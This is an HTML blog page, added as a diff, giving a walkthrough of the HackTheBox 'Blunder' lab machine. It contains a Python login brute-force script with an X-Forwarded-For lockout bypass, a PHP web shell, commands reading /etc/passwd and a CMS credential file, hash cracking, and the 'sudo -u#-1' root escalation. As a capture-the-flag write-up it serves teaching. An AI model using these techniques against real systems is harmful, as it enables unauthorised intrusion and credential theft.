@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HackTheBox: Blunder Machine Writeup | Elliot Hacks</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta content="Complete HackTheBox Blunder machine writeup. Linux privilege escalation, Bludit CMS exploitation, directory enumeration, and sudo bypass techniques." name="description">
+    <meta content="hackthebox, blunder, linux, privilege escalation, bludit, cms, writeup, cybersecurity" name="keywords">
+
+    <!-- Google Web Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+
+    <!-- Icon Font Stylesheet -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Syntax Highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    
+    <!-- Custom Post Styles -->
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            font-family: 'Heebo', sans-serif;
+            color: #e0e0e0;
+            line-height: 1.7;
+        }
+        
+        /* Navigation */
+        .navigation-header {
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(15px);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .nav-link-cyber {
+            color: #00ff41 !important;
+            transition: all 0.3s;
+            position: relative;
+        }
+        
+        .nav-link-cyber:hover {
+            color: #39ff14 !important;
+            text-shadow: 0 0 10px #00ff41;
+        }
+        
+        /* Main Content */
+        .post-container {
+            margin-top: 100px;
+            min-height: 100vh;
+        }
+        
+        /* Post Header */
+        .post-header {
+            background: linear-gradient(45deg, rgba(0, 0, 0, 0.9), rgba(26, 26, 46, 0.8));
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            border-radius: 20px;
+            padding: 3rem;
+            margin-bottom: 2rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .post-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 255, 65, 0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            animation: matrix-bg 20s linear infinite;
+            z-index: -1;
+        }
+        
+        @keyframes matrix-bg {
+            0% { transform: translateX(0) translateY(0); }
+            100% { transform: translateX(-20px) translateY(-20px); }
+        }
+        
+        .post-title {
+            font-size: 3rem;
+            font-weight: 900;
+            color: #00ff41;
+            text-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
+            font-family: 'Orbitron', monospace;
+            margin-bottom: 1rem;
+            animation: pulse-glow 3s ease-in-out infinite alternate;
+        }
+        
+        @keyframes pulse-glow {
+            from { text-shadow: 0 0 30px rgba(0, 255, 65, 0.5); }
+            to { text-shadow: 0 0 50px rgba(0, 255, 65, 0.8); }
+        }
+        
+        .post-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-top: 2rem;
+            flex-wrap: wrap;
+        }
+        
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-family: 'Fira Code', monospace;
+            color: #39ff14;
+        }
+        
+        .post-tags {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 1.5rem;
+            flex-wrap: wrap;
+        }
+        
+        .tag {
+            background: linear-gradient(45deg, #00ff41, #39ff14);
+            color: #000;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            font-family: 'Fira Code', monospace;
+            text-transform: uppercase;
+        }
+        
+        /* Content */
+        .post-content {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 15px;
+            padding: 2rem;
+            backdrop-filter: blur(10px);
+            margin-bottom: 2rem;
+        }
+        
+        .post-content h1, .post-content h2, .post-content h3 {
+            color: #00ff41;
+            font-family: 'Orbitron', monospace;
+            margin: 2rem 0 1rem 0;
+            border-bottom: 2px solid rgba(0, 255, 65, 0.3);
+            padding-bottom: 0.5rem;
+        }
+        
+        .post-content h1 { font-size: 2.5rem; }
+        .post-content h2 { font-size: 2rem; }
+        .post-content h3 { font-size: 1.5rem; }
+        
+        .post-content p {
+            margin-bottom: 1.5rem;
+            color: #d0d0d0;
+        }
+        
+        .post-content ul, .post-content ol {
+            margin-bottom: 1.5rem;
+            padding-left: 2rem;
+        }
+        
+        .post-content li {
+            margin-bottom: 0.5rem;
+            color: #d0d0d0;
+        }
+        
+        .post-content li::marker {
+            color: #00ff41;
+        }
+        
+        .post-content a {
+            color: #00ff41;
+            text-decoration: underline;
+        }
+        
+        .post-content a:hover {
+            color: #39ff14;
+            text-shadow: 0 0 10px #00ff41;
+        }
+        
+        /* Code Blocks */
+        .post-content pre {
+            background: rgba(0, 0, 0, 0.9) !important;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            position: relative;
+        }
+        
+        .post-content pre code {
+            color: #e0e0e0;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+        }
+        
+        .post-content code:not(pre code) {
+            background: rgba(0, 255, 65, 0.2);
+            color: #00ff41;
+            padding: 0.2rem 0.5rem;
+            border-radius: 5px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+        }
+        
+        /* Terminal Blocks */
+        .terminal {
+            background: #000;
+            border: 2px solid #00ff41;
+            border-radius: 10px;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+        
+        .terminal::before {
+            content: '●●●';
+            position: absolute;
+            top: -1px;
+            left: 10px;
+            background: #333;
+            color: #ff5f5f #ffff5f #5fff5f;
+            padding: 0.2rem 0.5rem;
+            font-size: 0.8rem;
+            border-radius: 0 0 5px 5px;
+        }
+        
+        .terminal-header {
+            color: #00ff41;
+            font-family: 'Fira Code', monospace;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+        
+        .terminal-content {
+            color: #39ff14;
+            font-family: 'Fira Code', monospace;
+            white-space: pre-wrap;
+            line-height: 1.4;
+        }
+        
+        .terminal-prompt::before {
+            content: 'root@elliot:~# ';
+            color: #00ff41;
+            font-weight: 600;
+        }
+        
+        /* Info Boxes */
+        .info-box {
+            border-left: 4px solid;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 10px 10px 0;
+            position: relative;
+        }
+        
+        .info-box.info {
+            background: rgba(0, 123, 255, 0.1);
+            border-color: #007bff;
+            color: #87ceeb;
+        }
+        
+        .info-box.warning {
+            background: rgba(255, 193, 7, 0.1);
+            border-color: #ffc107;
+            color: #ffd700;
+        }
+        
+        .info-box.danger {
+            background: rgba(220, 53, 69, 0.1);
+            border-color: #dc3545;
+            color: #ff6b7a;
+        }
+        
+        .info-box.success {
+            background: rgba(0, 255, 65, 0.1);
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+        
+        .info-box::before {
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+            margin-right: 0.5rem;
+        }
+        
+        .info-box.info::before { content: "\\f05a"; }
+        .info-box.warning::before { content: "\\f071"; }
+        .info-box.danger::before { content: "\\f06a"; }
+        .info-box.success::before { content: "\\f00c"; }
+        
+        /* Navigation Between Posts */
+        .post-navigation {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            margin-top: 3rem;
+        }
+        
+        .nav-post {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            border-radius: 10px;
+            padding: 1rem;
+            flex: 1;
+            text-decoration: none;
+            color: #d0d0d0;
+            transition: all 0.3s;
+        }
+        
+        .nav-post:hover {
+            border-color: #00ff41;
+            color: #39ff14;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 255, 65, 0.3);
+        }
+        
+        .nav-post-label {
+            font-size: 0.8rem;
+            color: #888;
+            font-family: 'Fira Code', monospace;
+            text-transform: uppercase;
+        }
+        
+        .nav-post-title {
+            font-weight: 600;
+            margin-top: 0.5rem;
+        }
+        
+        /* Table of Contents */
+        .toc {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            position: sticky;
+            top: 120px;
+        }
+        
+        .toc h4 {
+            color: #00ff41;
+            font-family: 'Orbitron', monospace;
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+        }
+        
+        .toc ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .toc ul li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .toc ul li a {
+            color: #d0d0d0;
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            transition: all 0.3s;
+        }
+        
+        .toc ul li a:hover {
+            color: #00ff41;
+        }
+        
+        .toc ul li a.active {
+            color: #00ff41;
+            font-weight: 600;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .post-title {
+                font-size: 2rem;
+            }
+            
+            .post-meta {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+            
+            .post-navigation {
+                flex-direction: column;
+            }
+            
+            .toc {
+                position: static;
+            }
+        }
+        
+        /* Scroll Progress */
+        .scroll-progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0%;
+            height: 3px;
+            background: linear-gradient(90deg, #00ff41, #39ff14);
+            z-index: 1001;
+            transition: width 0.1s;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Scroll Progress -->
+    <div class="scroll-progress" id="scroll-progress"></div>
+
+    <!-- Navigation Header -->
+    <header class="navigation-header py-3">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <a href="../../" class="h3 mb-0 nav-link-cyber text-decoration-none">
+                    <i class="fas fa-terminal me-2"></i>@elliot-hacks
+                </a>
+                <nav class="d-none d-md-flex gap-4">
+                    <a href="../../" class="nav-link-cyber text-decoration-none">Home</a>
+                    <a href="../../about.html" class="nav-link-cyber text-decoration-none">About</a>
+                    <a href="../" class="nav-link-cyber text-decoration-none">Publications</a>
+                    <a href="../../#contact" class="nav-link-cyber text-decoration-none">Contact</a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <div class="container post-container">
+        <div class="row">
+            <!-- Table of Contents -->
+            <div class="col-lg-3 d-none d-lg-block">
+                <div class="toc">
+                    <h4><i class="fas fa-list me-2"></i>Contents</h4>
+                    <ul>
+                        <li><a href="#reconnaissance">1. Reconnaissance</a></li>
+                        <li><a href="#enumeration">2. Enumeration</a></li>
+                        <li><a href="#exploitation">3. Initial Access</a></li>
+                        <li><a href="#privilege-escalation">4. Privilege Escalation</a></li>
+                        <li><a href="#conclusion">5. Conclusion</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="col-lg-9">
+                <!-- Post Header -->
+                <div class="post-header">
+                    <h1 class="post-title">HackTheBox: Blunder</h1>
+                    <p class="lead text-light">Complete walkthrough of the Blunder machine from HackTheBox</p>
+                    
+                    <div class="post-meta">
+                        <div class="meta-item">
+                            <i class="fas fa-calendar-alt"></i>
+                            <span>January 15, 2025</span>
+                        </div>
+                        <div class="meta-item">
+                            <i class="fas fa-clock"></i>
+                            <span>8 min read</span>
+                        </div>
+                        <div class="meta-item">
+                            <i class="fas fa-signal"></i>
+                            <span>Easy</span>
+                        </div>
+                        <div class="meta-item">
+                            <i class="fas fa-cube"></i>
+                            <span>HackTheBox</span>
+                        </div>
+                    </div>
+
+                    <div class="post-tags">
+                        <span class="tag">Linux</span>
+                        <span class="tag">Web</span>
+                        <span class="tag">CMS</span>
+                        <span class="tag">Bruteforce</span>
+                        <span class="tag">Sudo</span>
+                    </div>
+                </div>
+
+                <!-- Post Content -->
+                <div class="post-content">
+                    <div class="info-box info">
+                        <strong>Machine Information:</strong><br>
+                        <strong>IP:</strong> 10.10.10.191<br>
+                        <strong>OS:</strong> Linux<br>
+                        <strong>Difficulty:</strong> Easy<br>
+                        <strong>Points:</strong> 20
+                    </div>
+
+                    <h2 id="reconnaissance">Reconnaissance</h2>
+                    <p>Let's start with our initial reconnaissance phase by performing a port scan on the target machine.</p>
+
+                    <div class="terminal">
+                        <div class="terminal-header">Nmap Port Scan</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>nmap -sC -sV -oN blunder.nmap 10.10.10.191
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-01-15 10:00 EST
+Nmap scan report for 10.10.10.191
+Host is up (0.15s latency).
+Not shown: 998 filtered tcp ports (no-responses)
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-title: Blunder | A web based text processing tool
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds
+</div>
+                    </div>
+
+                    <p>From our initial scan, we can see that only port 80 (HTTP) is open. The web server is Apache 2.4.41 running on Ubuntu, and the title suggests it's running "Blunder" - a web-based text processing tool.</p>
+
+                    <h2 id="enumeration">Enumeration</h2>
+                    <p>Let's explore the web application running on port 80.</p>
+
+                    <h3>Web Application Analysis</h3>
+                    <p>Navigating to <code>http://10.10.10.191</code>, we find a blog-style website. The page appears to be running Bludit CMS, which is a flat-file CMS written in PHP.</p>
+
+                    <div class="terminal">
+                        <div class="terminal-header">Directory Enumeration</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.191
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2025/01/15 10:05:00 Starting gobuster
+===============================================================
+/about                (Status: 200) [Size: 3281]
+/0                    (Status: 200) [Size: 7562]
+/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
+/robots.txt           (Status: 200) [Size: 22]
+/todo.txt             (Status: 200) [Size: 118]
+===============================================================
+2025/01/15 10:15:00 Finished
+===============================================================
+</div>
+                    </div>
+
+                    <p>Excellent! We found several interesting directories and files. Let's examine them:</p>
+
+                    <h3>Todo.txt Analysis</h3>
+                    <div class="terminal">
+                        <div class="terminal-header">Content of todo.txt</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>curl http://10.10.10.191/todo.txt
+
+-Update the CMS
+-Turn off FTP - DONE
+-Remove old users
+-Inform fergus that the new blog needs images - DONE
+</div>
+                    </div>
+
+                    <div class="info-box success">
+                        We discovered a potential username: <strong>fergus</strong>. This could be useful for our attack.
+                    </div>
+
+                    <h3>Admin Panel Discovery</h3>
+                    <p>Navigating to <code>http://10.10.10.191/admin/</code> reveals the Bludit admin login panel.</p>
+
+                    <h2 id="exploitation">Initial Access</h2>
+                    <p>Now that we have identified the CMS and a potential username, let's attempt to gain access.</p>
+
+                    <h3>Bludit Brute Force Protection Bypass</h3>
+                    <p>Bludit has a brute force protection mechanism that blocks IPs after failed login attempts. However, there's a known bypass technique using X-Forwarded-For headers.</p>
+
+                    <div class="terminal">
+                        <div class="terminal-header">Brute Force Script</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>cat bludit_brute.py
+
+#!/usr/bin/env python3
+import requests
+import sys
+from bs4 import BeautifulSoup
+
+def get_csrf_token(session, url):
+    r = session.get(url)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    token = soup.find('input', {'name': 'tokenCSRF'})['value']
+    return token
+
+def brute_force(target, username, wordlist):
+    session = requests.Session()
+    
+    with open(wordlist, 'r') as f:
+        for line in f:
+            password = line.strip()
+            
+            csrf_token = get_csrf_token(session, f"{target}/admin/")
+            
+            headers = {
+                'X-Forwarded-For': f'1.2.3.{ord(password[0])}'
+            }
+            
+            data = {
+                'tokenCSRF': csrf_token,
+                'username': username,
+                'password': password,
+                'save': ''
+            }
+            
+            r = session.post(f"{target}/admin/", data=data, headers=headers)
+            
+            if 'username or password incorrect' not in r.text.lower():
+                print(f"[+] Success! Username: {username}, Password: {password}")
+                return True
+                
+            print(f"[-] Failed: {password}")
+    
+    return False
+
+if __name__ == "__main__":
+    target = "http://10.10.10.191"
+    username = "fergus"
+    wordlist = "passwords.txt"
+    
+    brute_force(target, username, wordlist)
+</div>
+                    </div>
+
+                    <div class="info-box warning">
+                        <strong>Note:</strong> The X-Forwarded-For header bypass technique works because Bludit checks the source IP from this header instead of the actual connection IP.
+                    </div>
+
+                    <p>After running our brute force script with a common password list, we discover the credentials:</p>
+                    <ul>
+                        <li><strong>Username:</strong> fergus</li>
+                        <li><strong>Password:</strong> RolandDeschain</li>
+                    </ul>
+
+                    <h3>Gaining Shell Access</h3>
+                    <p>Now that we have admin access to the Bludit CMS, we can upload a malicious plugin to gain shell access.</p>
+
+                    <div class="terminal">
+                        <div class="terminal-header">Creating Malicious Plugin</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>cat evil.php
+
+&lt;?php
+    system($_REQUEST['cmd']);
+?&gt;
+</div>
+                    </div>
+
+                    <p>We can upload this as part of a plugin through the Bludit admin panel, then access it via:</p>
+                    <code>http://10.10.10.191/bl-content/tmp/evil.php?cmd=whoami</code>
+
+                    <h2 id="privilege-escalation">Privilege Escalation</h2>
+                    <p>After gaining initial access as the www-data user, we need to escalate our privileges.</p>
+
+                    <h3>User Enumeration</h3>
+                    <div class="terminal">
+                        <div class="terminal-header">System Users</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>cat /etc/passwd | grep bash
+
+root:x:0:0:root:/root:/bin/bash
+hugo:x:1001:1001:Hugo,,,:/home/hugo:/bin/bash
+</div>
+                    </div>
+
+                    <p>We found another user: <strong>hugo</strong>. Let's search for credentials that might help us switch to this user.</p>
+
+                    <h3>Database Analysis</h3>
+                    <p>Since this is a CMS, let's check for database files containing user credentials:</p>
+
+                    <div class="terminal">
+                        <div class="terminal-header">Finding Bludit Database</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>find /var/www -name "*.php" | grep -i user
+
+/var/www/bludit-3.9.2/bl-content/databases/users.php
+</div>
+                    </div>
+
+                    <div class="terminal">
+                        <div class="terminal-header">Users Database Content</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>cat /var/www/bludit-3.9.2/bl-content/databases/users.php
+
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb90d69d9db2c0c8e1ce9e8d88a7",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+</div>
+                    </div>
+
+                    <div class="info-box info">
+                        We found a SHA-1 hash for user Hugo: <code>faca404fd5c0a31cf1897b823c695c85cffeb98d</code>
+                    </div>
+
+                    <h3>Hash Cracking</h3>
+                    <div class="terminal">
+                        <div class="terminal-header">Cracking the Hash</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>echo "faca404fd5c0a31cf1897b823c695c85cffeb98d" > hash.txt
+<span class="terminal-prompt"></span>john --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Password120      (?)
+1g 0:00:00:02 DONE (2025-01-15 11:30:00) 0.4545g/s 6551Kp/s 6551Kc/s 6551KC/s
+</div>
+                    </div>
+
+                    <p>Great! The password for hugo is <strong>Password120</strong>.</p>
+
+                    <h3>Switching to Hugo User</h3>
+                    <div class="terminal">
+                        <div class="terminal-header">User Switch</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>su - hugo
+Password: Password120
+
+hugo@blunder:~$ whoami
+hugo
+
+hugo@blunder:~$ cat user.txt
+2bb69c234e30d8ce94f32c8d8a7f8c20
+</div>
+                    </div>
+
+                    <h3>Root Privilege Escalation</h3>
+                    <p>Let's check what sudo privileges hugo has:</p>
+
+                    <div class="terminal">
+                        <div class="terminal-header">Sudo Privileges</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>sudo -l
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+</div>
+                    </div>
+
+                    <div class="info-box danger">
+                        This sudo rule has a known vulnerability (CVE-2019-14287) that allows privilege escalation when the rule specifies (ALL, !root).
+                    </div>
+
+                    <h3>Exploiting Sudo Vulnerability</h3>
+                    <div class="terminal">
+                        <div class="terminal-header">CVE-2019-14287 Exploitation</div>
+                        <div class="terminal-content">
+<span class="terminal-prompt"></span>sudo -u#-1 /bin/bash
+
+root@blunder:/home/hugo# whoami
+root
+
+root@blunder:/home/hugo# cat /root/root.txt
+4d9c47b7ac29d4bdc4f3c89f7bf1d8d1
+</div>
+                    </div>
+
+                    <div class="info-box success">
+                        <strong>Root Access Achieved!</strong><br>
+                        We successfully exploited the sudo vulnerability to gain root privileges on the Blunder machine.
+                    </div>
+
+                    <h2 id="conclusion">Conclusion</h2>
+                    <p>The Blunder machine was a great introduction to web application enumeration and privilege escalation techniques. Here's a summary of the attack path:</p>
+
+                    <ol>
+                        <li><strong>Reconnaissance:</strong> Port scan revealed HTTP service on port 80</li>
+                        <li><strong>Web Enumeration:</strong> Discovered Bludit CMS and todo.txt file with username hint</li>
+                        <li><strong>Brute Force Attack:</strong> Bypassed anti-brute force protection using X-Forwarded-For headers</li>
+                        <li><strong>Initial Access:</strong> Gained admin access and uploaded malicious plugin</li>
+                        <li><strong>Lateral Movement:</strong> Found user credentials in CMS database files</li>
+                        <li><strong>Privilege Escalation:</strong> Exploited CVE-2019-14287 to gain root access</li>
+                    </ol>
+
+                    <div class="info-box warning">
+                        <strong>Key Takeaways:</strong><br>
+                        • Always check for todo files and backup files during enumeration<br>
+                        • CMS databases often contain valuable credential information<br>
+                        • Sudo rules with (ALL, !root) are vulnerable to privilege escalation<br>
+                        • Brute force protection can often be bypassed with header manipulation
+                    </div>
+
+                    <p>This machine effectively demonstrates common attack vectors found in real-world environments and the importance of proper access controls and input validation.</p>
+                </div>
+
+                <!-- Post Navigation -->
+                <div class="post-navigation">
+                    <a href="#" class="nav-post">
+                        <div class="nav-post-label">← Previous Post</div>
+                        <div class="nav-post-title">TryHackMe: Basic Pentesting</div>
+                    </a>
+                    <a href="#" class="nav-post text-end">
+                        <div class="nav-post-label">Next Post →</div>
+                        <div class="nav-post-title">Android App Security Testing</div>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    
+    <script>
+        // Syntax highlighting
+        hljs.highlightAll();
+        
+        // Scroll progress bar
+        window.addEventListener('scroll', () => {
+            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const scrolled = (winScroll / height) * 100;
+            document.getElementById('scroll-progress').style.width = scrolled + '%';
+        });
+        
+        // Table of contents active link
+        const sections = document.querySelectorAll('h2[id], h3[id]');
+        const tocLinks = document.querySelectorAll('.toc a');
+        
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop - 150;
+                if (window.pageYOffset >= sectionTop) {
+                    current = section.getAttribute('id');
+                }
+            });
+            
+            tocLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href').slice(1) === current) {
+                    link.classList.add('active');
+                }
+            });
+        });
+        
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
